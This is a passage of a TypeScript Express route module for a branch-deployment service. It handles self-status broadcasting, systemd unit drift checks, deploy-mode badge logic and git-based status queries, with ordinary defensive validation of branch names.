import http from 'node:http';
import https from 'node:https';
import { isIP } from 'node:net';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createHash, randomUUID } from 'node:crypto';
import { execSync, spawn } from 'node:child_process';
import { createGzip } from 'node:zlib';
import { Router, type Request, type Response } from 'express';
import { StateService } from '../services/state.js';
import { resolveActorFromRequest } from '../services/actor-resolver.js';
import { WorktreeService } from '../services/worktree.js';
import { resolveEffectiveProfile, resolveDeployReadinessFloorSeconds, applyDeployReadinessFloor } from '../services/container.js';
import { classifyDeployRuntime, computeServiceDrift, applyDefaultDeployModesToBranch, branchUsesPrebuiltMode } from '../services/deploy-runtime.js';
import { isValidExtraProfileId, isValidServiceSubdomain, mergeBranchProfiles } from '../services/branch-extra-services.js';
import { classifyTriggerSource, deriveDeployMode, deriveCommitMeta, parsePulledSha, shouldRefreshCommitSha } from '../services/build-log-meta.js';
import { acquireBuildSlot, buildGateStatus } from '../services/build-gate.js';
import { recordBuild } from '../services/build-activity-tracker.js';
import type { ContainerService } from '../services/container.js';
import type { SchedulerService } from '../services/scheduler.js';
import type { JanitorService } from '../services/janitor.js';
import type { ExecutorRegistry } from '../scheduler/executor-registry.js';
import type { BranchEntry, CdsConfig, ExecOptions, IShellExecutor, OperationLog, OperationLogContainerSnapshot, OperationLogEvent, BuildProfile, BuildProfileOverride, ReadinessProbe, RoutingRule, ServiceState, InfraService, InfraVolume, DataMigration, MongoConnectionConfig, CdsPeer, ExecutorNode, ActiveSelfUpdate, SelfUpdateTimingBreakdown, Project, ProjectActivityLog, ResourceExternalAccessPolicy, ContainerLogArchiveEntry } from '../types.js';
import { discoverComposeFiles, parseComposeFile, parseComposeString, resolveEnvTemplates, toComposeYaml, parseCdsCompose, toCdsCompose } from '../services/compose-parser.js';
import type { ComposeServiceDef } from '../services/compose-parser.js';
import { computeRequiredInfra } from '../services/deploy-infra-resolver.js';
import { combinedOutput } from '../types.js';
import { topoSortLayers } from '../services/topo-sort.js';
import { detectStack, type DatabaseInitRecommendation, type StackDetection } from '../services/stack-detector.js';
import { buildInfraDataExec, detectInfraDataKind, maskSecretValues, runDockerExec } from './infra-data.js';
import { getInfraCatalogPublic } from '../services/infra-catalog.js';
import { assertProjectAccess } from './projects.js';
import { CheckRunRunner } from '../services/check-run-runner.js';
import { branchEvents, nowIso } from '../services/branch-events.js';
import { GitHubAppClient } from '../services/github-app-client.js';
import { classifyEnvKey } from '../config/known-env-keys.js';
import { sanitizeDockerRestartPolicy } from '../config/docker-restart-policy.js';
import { isAllowedCdsBranchName, isSafeGitRef } from '../services/github-webhook-dispatcher.js';
import { buildPreviewUrlForProject } from '../services/comment-template.js';
import { ROUTABLE_SERVICE_STATUSES } from '../services/forwarder-route-publisher.js';
import { maskSecrets as maskSecretsText, maskEnvRecord, maskBranchExtraProfilesEnv, isSensitiveKey, looksLikeUrlWithCredentials, shouldMask } from '../services/secret-masker.js';
import { buildUnifiedBranchResources, type UnifiedBranchResource } from '../services/resources.js';
import { fetchWithLockRetry } from '../services/git-fetch-retry.js';
import { resolveGitAuthEnv } from '../services/git-auth-env.js';
import { selfStatusCache, type RemoteBranchEntry } from '../services/self-status-cache.js';
import { cdsEventsBus } from '../services/cds-events-bus.js';
import { installSelfUpdateEventProjector } from '../services/self-update-event-projector.js';
import { nodeModulesVolumePrefix } from '../util/node-modules-volume.js';
import { analyzeChangeImpact, isWebOnlyChange } from '../services/change-impact-analyzer.js';
import { computeBundleFreshness } from '../services/bundle-freshness.js';
import { waitForFlushWithTimeout } from '../services/bounded-flush.js';
import { readBundledCdsCliVersion } from '../services/cdscli-version.js';
import { shouldTryCdsPrebuilt } from '../services/cds-prebuilt.js';
import { fetchCdsPrebuilt } from '../services/cds-prebuilt-runtime.js';
import { ProxyService } from '../services/proxy.js';
import { archiveBranchContainerLogs } from '../services/container-log-archiver.js';
import { normalizeLogText, type ServerEventLogSink } from '../services/server-event-log-store.js';
import {
  BranchOperationSupersededError,
  type BranchOperationCoordinator,
  type BranchOperationDecision,
  type BranchOperationKind,
  type BranchOperationLease,
  type BranchOperationTrigger,
  type PendingWebhookDeploy,
} from '../services/branch-operation-coordinator.js';
import { waitForRestartSafeBranchOperations, resolveRestartDrainTimeoutFromRequest } from '../services/restart-drain.js';

// ── Self-status SSE 模块级状态 ────────────────────────────────────────
// 2026-05-28 重构:状态权威源迁移到 services/self-status-cache.ts。
//
// - selfStatusContext 仍保留:旧的 /api/self-status/stream 端点(向后兼容)
//   和 broadcastSelfStatus()(被 github-webhook.ts 调用)依赖它来 compute
//   payload。新代码不要再从这里读;一律用 selfStatusCache.getSnapshot()。
// - selfStatusClients:旧 SSE 端点的客户端池。新的统一通道
//   GET /api/cds-events 走 cdsEventsBus,不再加入这个池。
// - broadcastSelfStatus():改为薄包装,委托给 selfStatusCache.enqueueRefresh()。
//   cache 跑完后会通过 bus 发 self.status 事件,旧客户端池由本模块兼容订阅。
let selfStatusContext: {
  repoRoot: string;
  shell: IShellExecutor;
  stateService: StateService;
  gitAuthEnvProvider?: (repoRoot: string) => Promise<ExecOptions['env'] | undefined>;
} | null = null;
const selfStatusClients = new Set<import('express').Response>();

// 启动时把 bus 的 self.status 事件桥接到旧 selfStatusClients 池,保证
// 旧的 /api/self-status/stream 订阅者仍能收到 update。新的 cds-events 端点
// 独立订阅 bus,不走这个桥。
let busBridgeInstalled = false;
function installLegacyStreamBridge(): void {
  if (busBridgeInstalled) return;
  busBridgeInstalled = true;
  cdsEventsBus.subscribe((envelope) => {
    if (envelope.type !== 'self.status') return;
    if (selfStatusClients.size === 0) return;
    const line = `event: update\ndata: ${JSON.stringify(envelope.data)}\n\n`;
    for (const client of Array.from(selfStatusClients)) {
      try {
        client.write(line);
      } catch {
        selfStatusClients.delete(client);
      }
    }
  });
}

/**
 * 重新计算 self-status payload 并向所有 SSE 客户端推送 update 事件。
 *
 * 由 GitHub push webhook(当前 CDS 跑的分支收到新 commit 时)调用。
 * 也保留给后续 self-update 完成钩子复用。
 *
 * 实现要点:
 *   - 这次允许触发 git fetch(带 5s 超时),否则前端拿到的 ahead 计数还是旧的
 *   - 远端不可达 → 用 fetchOk=false + cached refs 兜底,不阻塞推送
 *   - 写失败的 client 从池里清除(对端已断开)
 */
// 2026-05-28 重构后,broadcast 的 coalesce / queue 逻辑收敛到 selfStatusCache。
// 这里保留 broadcastInFlight = false 哨兵给 /api/self-status/stream 端点的
// per-client first-update 检测用(它依赖这个标志判断"现在是否已经有 broadcast
// 在跑,我不要再 fetch 一遍")。cache 同时刻只允许一个 job,行为等价。
let broadcastInFlight = false;
const DELETE_COMPLETION_AUDIT_TIMEOUT_MS = 500;
const DEFAULT_DELETE_STATE_FLUSH_TIMEOUT_MS = 30_000;
const SELF_UPDATE_STATE_FLUSH_TIMEOUT_MS = 1000;

function getDeleteStateFlushTimeoutMs(): number {
  const raw = Number(process.env.CDS_DELETE_STATE_FLUSH_TIMEOUT_MS);
  if (!Number.isFinite(raw) || raw <= 0) return DEFAULT_DELETE_STATE_FLUSH_TIMEOUT_MS;
  return Math.max(100, Math.min(raw, 30_000));
}

/**
 * 2026-05-28 重构后:薄包装,委托给 selfStatusCache。
 *
 * github-webhook.ts 在 push 命中本机当前分支时调用本函数。cache 会:
 *   - 若已有 refresh job 在跑 → 复用,不重复 fetch
 *   - 否则启动新 job,跑完发 self.status 事件
 *   - 旧 selfStatusClients 池由 installLegacyStreamBridge() 订阅 bus 自动同步
 *
 * 节流由 cache 自己处理(webhook trigger 默认 5s 去重),无需调用方再 coalesce。
 */
export async function broadcastSelfStatus(): Promise<void> {
  if (!selfStatusContext) return;
  // 进入 in-flight 标记,只为兼容旧 /api/self-status/stream 端点的
  // per-client first-update 跳过逻辑(避免 snapshot → broadcast → per-client 三连闪)
  broadcastInFlight = true;
  try {
    selfStatusCache.enqueueRefresh('webhook');
  } finally {
    // 立即放标记 — cache 是异步跑的,这里只阻止 stream handler 在同一 tick 内
    // 启动 per-client fetch。cache 的 job 内部 publish self.status 后,
    // bus bridge 会把 update 推给 selfStatusClients,客户端体验等价。
    broadcastInFlight = false;
  }
}

/**
 * 检测 cds/systemd/cds-master.service(repo)与 /etc/systemd/system/cds-master.service
 * (installed)是否漂移。归一化 install-path 后做 sha1 比对,命中就返 hash 对让
 * MaintenanceTab 的 drift banner 显示一行 sudo 修复命令。
 *
 * 抽成顶层 helper 是为了 /api/self-status 的 catch fallback(Bugbot 50e705cf)
 * 也能带回这个字段:git fetch 偶发失败时 banner 不应消失。
 */
type SystemdUnitDrift = { repoHash: string; installedHash: string; installedAt?: string };
function detectSystemdUnitDrift(repoRoot: string): SystemdUnitDrift | null {
  const repoUnit = path.resolve(repoRoot, 'cds', 'systemd', 'cds-master.service');
  const installedUnit = '/etc/systemd/system/cds-master.service';
  if (!fs.existsSync(repoUnit) || !fs.existsSync(installedUnit)) return null;
  const repoText = fs.readFileSync(repoUnit, 'utf8');
  const installedText = fs.readFileSync(installedUnit, 'utf8');
  // install_systemd_cmd 会替换 ExecStart 的 /opt/prd_agent/... 路径,
  // 比较时归一化:把两边的 /opt/prd_agent/... 路径全部抹掉,只看其他字段。
  // 否则 development 装在 /home/user/ 永远 drift 误报。
  const normalize = (s: string): string =>
    s
      .replace(/^WorkingDirectory=.*/m, 'WorkingDirectory=<install-path>')
      .replace(/^Environment=PATH=.*/m, 'Environment=PATH=<resolved>')
      .replace(/^Environment=CDS_REPO_ROOT=.*/m, 'Environment=CDS_REPO_ROOT=<install-path>')
      .replace(/^ExecStart=.*master-run.*/m, 'ExecStart=<install-path>/exec_cds.sh master-run')
      .replace(/^ExecStartPre=\S+/gm, 'ExecStartPre=<resolved-bin>')
      .replace(/^ReadWritePaths=.*/m, 'ReadWritePaths=<resolved>');
  if (normalize(repoText) === normalize(installedText)) return null;
  const hash = (s: string): string => createHash('sha1').update(s).digest('hex').slice(0, 8);
  const drift: SystemdUnitDrift = {
    repoHash: hash(normalize(repoText)),
    installedHash: hash(normalize(installedText)),
  };
  try {
    drift.installedAt = fs.statSync(installedUnit).mtime.toISOString();
  } catch { /* tolerate */ }
  return drift;
}

type BranchDeployRuntime = {
  kind: 'source' | 'release' | 'mixed';
  label: string;
  title: string;
  activeProfiles: number;
  releaseProfiles: number;
  sourceProfiles: number;
  modes: string[];
  /**
   * 2026-05-14 真实态徽章：配置已切到发布版，但容器还没真正以发布版跑
   * 起来（正在重部署 / 还停着 / 旧容器仍是源码构建）。true 时卡片应显示
   * 「发布版·待生效」橙色，而不是绿色「发布版」——区分"配置意图"与
   * "运行现状"，杜绝设了 override 就亮绿的虚假徽章。
   */
  pendingPublish: boolean;
  /**
   * 2026-06-23 极速版（CI 预构建）：是否有任一 profile 走预构建镜像部署模式。
   * true 时前端把徽章从「发布版」细化为「极速版」（拉取 CI 镜像,非本机编译）。
   */
  prebuilt: boolean;
  /**
   * 2026-05-29 P0 止血：期望态 vs 实际态漂移检测。
   *
   * 病根（本次 openvisual 事故暴露）：branch.services 是"上次部署时的快照"，
   * 项目新增 build profile 后已部署分支不会自动回灌 —— 于是 main 有 3 个
   * 服务、PR 分支只有 2 个，卡片只显示数量、看不出"少了哪个 / 哪个挂了"。
   *
   * 这里把期望（项目所有 build profile）和实际（branch.services）做 diff：
   *  - missingProfileIds: profile 存在但分支没有对应服务（= 漂移，需补部署）
   *  - unhealthyProfileIds: 服务存在但不是 running（error / stopped）
   *  - expectedCount / healthyCount: 卡片显示 "N/M 健康" 用
   *  - hasDrift: 已部署过的分支才判（从未部署的 0 服务不算漂移，算"未部署"）
   *
   * 注意：这是**容器级**漂移（容器在不在 / 跑没跑）。"容器在跑但应用 503"
   * 那层需要 live 探针，state 里没存，留作后续 reconcile 升级。
   */
  drift: {
    expectedCount: number;
    healthyCount: number;
    missingProfileIds: string[];
    unhealthyProfileIds: string[];
    hasDrift: boolean;
  };
};

// classifyDeployRuntime 已抽到 services/deploy-runtime.ts（SSOT，与
// auto-lifecycle.ts 共用同一份正则，避免两处漂移）。

function isSyntheticCdsManagedRuntimeBranch(
  branch: Pick<BranchEntry, 'branch' | 'githubCommitSha'>,
  project?: Pick<Project, 'kind'> | null,
): boolean {
  if (project?.kind !== 'shared-service') return false;
  return branch.branch === 'cds-managed-runtime' && branch.githubCommitSha === 'cds-managed-runtime';
}

/**
 * Landing path for a named-subdomain preview link shown in the branch panel.
 * Known LLM gateway subdomains mount their API under /gw/* (console) or /gw/v1/* (serving) and
 * 404 at the bare root, so we land on their health endpoint. Every other named service (docs /
 * metrics / …) is published to the container root by the forwarder, so honor the profile's
 * readiness path when it declares one, else '/'. Never force a generic service onto /gw/* — that
 * would 404 despite a valid host (Codex P2).
 */
function resolveGatewayLandingPath(subdomain: string, readinessPath?: string): string {
  const sub = subdomain.toLowerCase();
  // Serving engine (llmgw-serve): API under /gw/v1/*.
  if (sub === 'llmgw-serve') return '/gw/v1/healthz';
  // Console (llmgw): API under /gw/*.
  if (sub === 'llmgw') return '/gw/healthz';
  const trimmed = (readinessPath ?? '').trim();
  if (trimmed && trimmed.startsWith('/')) return trimmed;
  return '/';
}

function githubLoginFromCommitEmail(email: string): string | null {
  const normalized = email.trim().toLowerCase();
  const match = normalized.match(/^(?:(?:\d+)\+)?([a-z0-9](?:[a-z0-9-]{0,37}[a-z0-9])?)@users\.noreply\.github\.com$/i);
  return match?.[1] || null;
}

function githubLoginFromCommitName(name: string): string | null {
  const normalized = name.trim();
  return /^[a-z0-9](?:[a-z0-9-]{0,37}[a-z0-9])?$/i.test(normalized) ? normalized : null;
}

function buildCommitBuilder(name?: string, email?: string): {
  name: string;
  email?: string;
  login?: string;
  avatarUrl?: string;
} | undefined {
  const cleanName = (name || '').trim();
  const cleanEmail = (email || '').trim();
  if (!cleanName && !cleanEmail) return undefined;
  const login = cleanEmail ? githubLoginFromCommitEmail(cleanEmail) : githubLoginFromCommitName(cleanName);
  return {
    name: cleanName || login || cleanEmail,
    ...(cleanEmail ? { email: cleanEmail } : {}),
    ...(login ? { login, avatarUrl: `https://github.com/${encodeURIComponent(login)}.png?size=64` } : {}),
  };
}

function buildGithubSenderBuilder(branch: BranchEntry): {
  name: string;
  login?: string;
  avatarUrl?: string;
} | undefined {
  const login = (branch.githubSenderLogin || '').trim();
  const avatarUrl = (branch.githubSenderAvatarUrl || '').trim();
  if (!login && !avatarUrl) return undefined;
  return {
    name: login || 'GitHub',
    ...(login ? { login } : {}),
    ...(avatarUrl ? { avatarUrl } : {}),
  };
}

function mergeBuilderAvatar(
  builder: { name: string; email?: string; login?: string; avatarUrl?: string } | undefined,
  fallback: { name: string; login?: string; avatarUrl?: string } | undefined,
): { name: string; email?: string; login?: string; avatarUrl?: string } | undefined {
  if (!builder) return fallback;
  if (builder.avatarUrl || !fallback?.avatarUrl) return builder;
  return {
    ...builder,
    login: builder.login || fallback.login,
    avatarUrl: fallback.avatarUrl,
  };
}

function isAiActivityLog(entry: ProjectActivityLog): boolean {
  const actor = entry.actor || '';
  return entry.type === 'ai-occupy'
    || entry.type === 'ai-release'
    || actor === 'ai'
    || actor.startsWith('ai:');
}

function summarizeBranchDeployRuntime(
  branch: BranchEntry,
  profiles: BuildProfile[],
): BranchDeployRuntime {
  // 真相 = "正在跑的容器实际用哪个 deploy mode"（svc.deployedMode），
  // 不是"配置成什么"（profileOverrides）。两者分别算，再比对得出徽章。
  let releaseProfiles = 0;   // 实际以发布版在跑的 profile 数（真相）
  let sourceProfiles = 0;    // 实际以源码在跑 / 未跑的 profile 数
  let pendingPublish = false; // 配置=发布版 但运行现状还没跟上
  let prebuilt = false;       // 配置=极速版（任一 profile 走预构建镜像）
  const modeLabels: string[] = [];

  for (const profile of profiles) {
    const effectiveProfile = resolveEffectiveProfile(profile, branch);
    if (effectiveProfile.prebuiltImage === true) prebuilt = true;
    const configMode = effectiveProfile.activeDeployMode;
    const configLabel = configMode
      ? effectiveProfile.deployModes?.[configMode]?.label || configMode
      : '源码';
    const configKind = classifyDeployRuntime(configMode, configLabel);

    const svc = branch.services?.[profile.id];
    const running = svc?.status === 'running';
    const hasTruth = running && svc?.deployedMode !== undefined;
    // 真相 = "现在跑的是什么"。
    //  - running 且有 deployedMode 戳 → 用戳（确知真相）。
    //  - running 但无戳（旧数据）→ 退回信任配置，避免存量 running 分支
    //    齐刷刷误报待生效。
    //  - 没在跑 → 它**不在以任何模式运行**，actualMode 视为源码/未知。
    //    2026-05-14 Codex review P2：之前 !running 也回退 configMode，
    //    导致"配置 release 但已 auto-stop/手动停"的分支被算成 release、
    //    亮绿徽章（前端 kind==='release' 先于 pendingPublish 判断），
    //    而它其实该是「发布版·待生效」。停着就不能算真发布。
    const actualMode = hasTruth
      ? (svc!.deployedMode as string)
      : running
        ? configMode
        : '';
    const actualLabel = actualMode
      ? effectiveProfile.deployModes?.[actualMode]?.label || actualMode
      : '源码';
    const actualKind = classifyDeployRuntime(actualMode, actualLabel);

    if (actualKind === 'release') releaseProfiles += 1;
    else sourceProfiles += 1;

    // 配置要发布版，但真相不是发布版（容器没跟上 / 还停着 / 旧源码构建）
    // → pending。仅在"确知真相 且 真相≠release"或"配置 release 但没在跑"
    // 时判 pending；旧数据无真相时不误报。
    if (configKind === 'release' && actualKind !== 'release') pendingPublish = true;
    if (configKind === 'release' && !running) pendingPublish = true;

    // 极速版(prebuilt)特例（Codex P2: mark static-to-express as pending）:
    // static 与 express 都归类 release,上面 configKind/actualKind 比对都是 release →
    // 不会判 pending,但容器实际还是旧 static 镜像。只要"配置=极速版"而"实际跑的不是
    // 这个极速版模式"（没在跑 / 确知 deployedMode 与 configMode 不一致）就该判待生效,
    // 否则卡片会亮"极速版"绿徽章而其实没切过去。无真相的旧数据不误报(沿用上面口径)。
    if (effectiveProfile.prebuiltImage === true) {
      if (!running) pendingPublish = true;
      else if (hasTruth && svc!.deployedMode !== configMode) pendingPublish = true;
    }

    const suffix = hasTruth && actualMode !== configMode
      ? `${actualLabel}（配置 ${configLabel}，待生效）`
      : actualLabel;
    modeLabels.push(`${profile.name || profile.id}: ${suffix}`);
  }

  const activeProfiles = profiles.length;
  const kind: BranchDeployRuntime['kind'] = releaseProfiles > 0 && sourceProfiles > 0
    ? 'mixed'
    : releaseProfiles > 0
      ? 'release'
      : 'source';
  const label = kind === 'release'
    ? '发布版'
    : kind === 'mixed'
      ? '混合'
      : '源码';

  return {
    kind,
    label,
    title: modeLabels.length > 0
      ? `实际运行模式: ${modeLabels.join(' / ')}${pendingPublish ? '（发布版配置已设，等待重新部署生效）' : ''}`
      : '当前没有构建配置，按源码默认模式显示',
    activeProfiles,
    releaseProfiles,
    sourceProfiles,
    modes: modeLabels,
    pendingPublish,
    prebuilt,
    // 漂移检测走 deploy-runtime.ts 的纯函数 SSOT(可单测、与本文件解耦)
    drift: computeServiceDrift(profiles.map((p) => p.id), branch.services),
  };
}

/**
 * 把一次成功部署的整体运行模式归类为 'release' | 'source'，用于耗时样本分桶。
 *
 * 复用 summarizeBranchDeployRuntime 的真相判定（看容器实际跑的 deployedMode，
 * 而非配置意图）。kind='release'/'mixed' → 'release'（只要有一个服务以发布版
 * 在跑，整体就按发布版耗时统计，避免被混合里的源码服务拉低）；否则 'source'。
 */
function classifyBranchDeployModeForDuration(
  branch: BranchEntry,
  profiles: BuildProfile[],
): import('../types.js').DeployDurationMode {
  const runtime = summarizeBranchDeployRuntime(branch, profiles);
  return runtime.kind === 'release' || runtime.kind === 'mixed' ? 'release' : 'source';
}

/**
 * 部署成功后记录一次耗时样本（毫秒）。
 *   - "ready" 耗时 = runtimeStartedAt - startedAt（拿不到就 finishedAt - startedAt）。
 *   - 仅成功（opLog.status==='completed'）时记录；失败不记（失败耗时无参考价值）。
 *   - 上界保护取 buildTimeout*2（缺省 30 分钟，由 recordDeployDuration 兜底），
 *     过滤掉超时/卡死的离谱样本。
 */
function recordDeployDurationSample(
  stateService: StateService,
  branch: BranchEntry,
  profiles: BuildProfile[],
  opLog: OperationLog,
): void {
  if (opLog.status !== 'completed') return;
  // 只在拿到真正的"就绪"信号(runtimeStartedAt，即 readiness 探测通过)时才采样。
  // 多服务 finalize 会在"无错误"时即置 completed，此时容器可能还没 running、
  // runtimeStartedAt 未设——若退化用 finishedAt-startedAt 会记下远短于真实就绪
  // 的耗时，污染发布版/热加载的中位 ETA（修复 PR #865 Bugbot「未就绪也采样」）。
  // 没有就绪时间就跳过本次采样（宁可样本少而准，等待页/卡片照样优雅降级显示已耗时）。
  if (!opLog.runtimeStartedAt) return;
  const startMs = Date.parse(opLog.startedAt);
  const endMs = Date.parse(opLog.runtimeStartedAt);
  if (!Number.isFinite(startMs) || !Number.isFinite(endMs)) return;
  const elapsedMs = endMs - startMs;
  const mode = classifyBranchDeployModeForDuration(branch, profiles);
  // 上界：取参与本次部署的 profile 里最大的 buildTimeout * 2，兜底 30 分钟。
  const maxTimeout = profiles.reduce((acc, p) => Math.max(acc, p.buildTimeout || 0), 0);
  const maxReasonableMs = maxTimeout > 0 ? maxTimeout * 2 : 30 * 60 * 1000;
  stateService.recordDeployDuration(branch.projectId || 'default', mode, elapsedMs, maxReasonableMs);
}

// 2026-06-23：实现已下沉到 deploy-runtime.ts 的 applyDefaultDeployModesToBranch（SSOT）,
// 供 branches.ts（建分支）与 github-webhook-dispatcher.ts（webhook 自动建分支）共用。
const applyProjectDefaultDeployModes = applyDefaultDeployModesToBranch;

/**
 * 纯计算 self-status payload。
 * 与 GET /api/self-status handler 共享同一份逻辑,避免双份维护。
 *
 * skipFetch=true → SSE 首屏 snapshot 用本地 cached refs(不发网络)
 * skipFetch=false → 真实查询(走 git fetch,带超时)
 */
async function computeSelfStatusPayload(
  ctx: {
    repoRoot: string;
    shell: IShellExecutor;
    stateService: StateService;
    gitAuthEnvProvider?: (repoRoot: string) => Promise<ExecOptions['env'] | undefined>;
  },
  opts: { skipFetch: boolean },
): Promise<Record<string, unknown>> {
  const { repoRoot, shell, stateService } = ctx;
  const degradedReasons: string[] = [];
  const safeExec = async (
    cmd: string,
    execOpts: { cwd: string; timeout?: number } = { cwd: repoRoot },
    fallback = '',
  ): Promise<string> => {
    try {
      const r = await shell.exec(cmd, execOpts);
      if (r.exitCode !== 0) {
        degradedReasons.push(`${cmd.slice(0, 40)}... exit=${r.exitCode}`);
        return fallback;
      }
      return r.stdout.trim();
    } catch (err) {
      degradedReasons.push(`${cmd.slice(0, 40)}... ${(err as Error).message}`);
      return fallback;
    }
  };

  const currentBranch = await safeExec('git rev-parse --abbrev-ref HEAD');
  const headSha = await safeExec('git rev-parse --short HEAD');
  const headIso = await safeExec('git log -1 --format=%cI HEAD');

  // Codex Review 2026-05-06 P2: shell injection 防御。currentBranch 来自
  // `git rev-parse --abbrev-ref HEAD`,git 自己应该已经拒绝含 shell
  // metacharacters 的分支名,但 defense-in-depth —— 万一 detached HEAD /
  // 损坏 ref / 老 git 版本边界 case 漏网,后续 `git fetch origin ${branch}`
  // 等命令会通过 child_process.exec 让 metacharacter 改变命令行为。
  // self-update / self-force-sync 路径已用 isSafeGitRef 守门,这里补齐。
  const branchIsSafe = currentBranch && isSafeGitRef(currentBranch);

  let fetchOk = true;
  let fetchError = '';
  if (opts.skipFetch) {
    fetchOk = false;
    fetchError = 'skipped (snapshot uses cached refs)';
  } else if (branchIsSafe) {
    // 警告 Bugbot Review 2026-05-06 930c5f98 + e0f66dce: broadcastSelfStatus 在
    // webhook 风暴期间会和 deploy worker 的 git fetch 抢同一个
    // .git/refs/remotes/.../<branch>.lock。共享 fetchWithLockRetry(SSOT 在
    // services/git-fetch-retry.ts),与 WorktreeService 同语义,改一处生效全局。
    try {
      const env = await ctx.gitAuthEnvProvider?.(repoRoot);
      const fetchResult = await fetchWithLockRetry(
        shell,
        repoRoot,
        currentBranch,
        { timeoutMs: 5_000, env },
      );
      if (fetchResult.exitCode !== 0) {
        fetchOk = false;
        fetchError = (fetchResult.stderr || fetchResult.stdout || '').trim().slice(0, 500);
      }
    } catch (err) {
      fetchOk = false;
      fetchError = (err as Error).message;
    }
  } else if (!currentBranch) {
    fetchOk = false;
    fetchError = 'currentBranch unknown — skipped fetch';
  } else {
    fetchOk = false;
    fetchError = `currentBranch ${JSON.stringify(currentBranch).slice(0, 80)} 含不安全字符,跳过 git fetch`;
    degradedReasons.push('currentBranch unsafe — fetch/diff skipped');
  }

  let remoteAheadCount = 0;
  let localAheadCount = 0;
  const remoteAheadSubjects: Array<{ sha: string; subject: string; date: string }> = [];
  if (branchIsSafe) {
    const counts = await safeExec(
      `git rev-list --left-right --count HEAD...origin/${currentBranch}`,
      { cwd: repoRoot, timeout: 5_000 },
    );
    if (counts) {
      const parts = counts.split(/\s+/);
      localAheadCount = parseInt(parts[0] || '0', 10) || 0;
      remoteAheadCount = parseInt(parts[1] || '0', 10) || 0;
    }
    if (remoteAheadCount > 0) {
      const log = await safeExec(
        `git log --format='%h%x1f%cI%x1f%s' -n 5 HEAD..origin/${currentBranch}`,
        { cwd: repoRoot, timeout: 5_000 },
      );
      if (log) {
        for (const line of log.split('\n')) {
          if (!line.trim()) continue;
          const [sha, date, subject] = line.split('\x1f');
          if (sha && subject) {
            remoteAheadSubjects.push({
              sha: sha.trim(),
              date: (date || '').trim(),
              subject: subject.trim(),
            });
          }
        }
      }
    }
  }

  let history: ReturnType<typeof stateService.getSelfUpdateHistory> = [];
  try {
    history = stateService.getSelfUpdateHistory(20);
  } catch (err) {
    degradedReasons.push(`getSelfUpdateHistory: ${(err as Error).message}`);
  }
  let activeSelfUpdate = stateService.getActiveSelfUpdate();
  if (activeSelfUpdate) {
    const activeStartedMs = Date.parse(activeSelfUpdate.startedAt);
    const latestCompleted = history[0];
    const latestCompletedMs = latestCompleted?.ts ? Date.parse(latestCompleted.ts) : Number.NaN;
    if (
      Number.isFinite(activeStartedMs) &&
      Number.isFinite(latestCompletedMs) &&
      latestCompletedMs >= activeStartedMs
    ) {
      stateService.clearSelfUpdateActive();
      activeSelfUpdate = null;
      degradedReasons.push('active self-update marker was stale and has been cleared');
    }
    // 2026-05-28 增加心跳超时清理:lastTickAt 超过 180s 没动 → sidecar 死了,
    // 清掉 marker 防止前端永久显示"更新进行中"。
    if (activeSelfUpdate?.lastTickAt) {
      const lastTickMs = Date.parse(activeSelfUpdate.lastTickAt);
      if (Number.isFinite(lastTickMs) && Date.now() - lastTickMs > 180_000) {
        stateService.clearSelfUpdateActive();
        activeSelfUpdate = null;
        degradedReasons.push('active self-update marker had no heartbeat for >180s, cleared');
      }
    }
  }

  let webBuildSha = '';
  let webBuildError = '';
  try {
    const shaFile = path.resolve(repoRoot, 'cds', 'web', 'dist', '.build-sha');
    if (fs.existsSync(shaFile)) {
      webBuildSha = fs.readFileSync(shaFile, 'utf8').trim().slice(0, 40);
    }
    const errFile = path.resolve(repoRoot, 'cds', 'web', 'dist', '.build-error');
    if (fs.existsSync(errFile)) {
      webBuildError = fs.readFileSync(errFile, 'utf8').trim().slice(0, 2000);
    }
  } catch (err) {
    degradedReasons.push(`webBuildSha: ${(err as Error).message}`);
  }

  // 用户反馈 2026-05-06:每次改 unit 都要 sudo 重装太蠢。重构后 unit 文件
  // 极少改,但确实改时 operator 不知道 → 默默用旧 unit。这里检测 drift,
  // 命中就在 self-status payload 里曝光,UI 提示 operator 用一行命令重装。
  // 警告 Bugbot 50e705cf:抽到顶层 helper detectSystemdUnitDrift,/api/self-status
  // catch fallback 也要带回这个字段,否则 git fetch 偶发失败时 drift banner 消失。
  let systemdUnitDrift: SystemdUnitDrift | null = null;
  try {
    systemdUnitDrift = detectSystemdUnitDrift(repoRoot);
  } catch (err) {
    degradedReasons.push(`unitDrift: ${(err as Error).message}`);
  }

  const bundleFreshness = await computeBundleFreshness({
    repoRoot,
    shell,
    headSha,
    bundleSha: webBuildSha,
    buildError: webBuildError,
  });
  if (bundleFreshness.staleReason === 'diff-failed' || bundleFreshness.staleReason === 'invalid-sha') {
    degradedReasons.push(`bundleFreshness: ${bundleFreshness.detail || bundleFreshness.staleReason}`);
  }

  const daemonReadyAt = stateService.getState().daemonReadyAt || null;
  const pidStartedAt = (globalThis as unknown as { __CDS_PROCESS_STARTED_AT?: string }).__CDS_PROCESS_STARTED_AT || null;
  const lastSelfUpdate = history[0] || null;
  let restartStatus: 'not_required' | 'pending' | 'completed' | 'incomplete' = 'not_required';
  if (activeSelfUpdate) {
    restartStatus = 'pending';
  } else if (lastSelfUpdate?.status === 'success' && lastSelfUpdate.updateMode !== 'web-only') {
    const updateMs = lastSelfUpdate.ts ? Date.parse(lastSelfUpdate.ts) : Number.NaN;
    // 重启"已确认" = 当前正在跑的进程确实是这次更新之后才起来的。两个独立信号，
    // 任一成立即视为已重启，避免单一信号丢失导致长期误报"重启未确认"：
    //   1) daemonReadyAt：新进程 server.listen 后由 recordDaemonReady() 盖戳，
    //      但只在能回填上一条 totalElapsedMs 时才 save()，偶发不落盘 → 读到旧值/空。
    //   2) pidStartedAt（__CDS_PROCESS_STARTED_AT）：进程模块加载即盖戳（index.ts:45），
    //      无条件可靠，作为权威兜底信号。进程启动时刻 >= 更新开始时刻即证明已重启。
    // 二者皆早于/缺失才判 incomplete（即更新成功但进程没换 = 真的没重启）。
    const readyMs = daemonReadyAt ? Date.parse(daemonReadyAt) : Number.NaN;
    const pidMs = pidStartedAt ? Date.parse(pidStartedAt) : Number.NaN;
    const confirmedByDaemon = Number.isFinite(readyMs) && Number.isFinite(updateMs) && readyMs >= updateMs;
    const confirmedByPid = Number.isFinite(pidMs) && Number.isFinite(updateMs) && pidMs >= updateMs;
    restartStatus = confirmedByDaemon || confirmedByPid ? 'completed' : 'incomplete';
  }

  return {
    currentBranch,
    headSha,
    headIso,
    fetchOk,
    fetchError,
    remoteAheadCount,
